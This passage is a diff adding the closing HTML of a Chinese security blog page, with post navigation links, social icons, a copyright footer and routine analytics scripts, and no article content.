+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">天才少年黑客被苹果公司“招安”</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/1730/">
+            <span class="next-text nav-default">计算机犯罪司法解释：提供程序工具属犯罪</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
